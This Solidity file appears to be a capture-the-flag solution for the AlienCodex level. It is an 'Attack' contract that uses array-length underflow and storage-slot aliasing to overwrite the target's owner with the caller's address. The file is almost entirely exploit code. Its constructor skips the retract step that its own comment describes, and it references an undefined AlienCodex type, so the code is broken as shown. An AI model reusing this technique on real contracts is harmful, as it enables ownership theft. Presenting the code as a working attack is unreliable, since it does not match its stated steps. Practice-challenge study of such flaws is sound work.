// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

/*
    slot 0 - 21bytes --> address(owner) 20 bytes + bool contact;  
    slot 1 - 32bytes --> bytes32[] codex.length;

    1. we will create an underflow in bytes[] codex calling retract to do codex.length-- (2**256-1)
    2. we will find the storage location of the owner by doing (2**256-keccak(slot1))
    3. using the function revise(uint i, bytes _content) we will be able to set the slot for the new owner
*/

contract Attack{

    constructor(AlienCodex _target) public {
        //find the storage of the owner address
        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;
        i-=h;
        bytes32 content = bytes32(uint256(msg.sender));
        _target.revise(i,content);
    }

}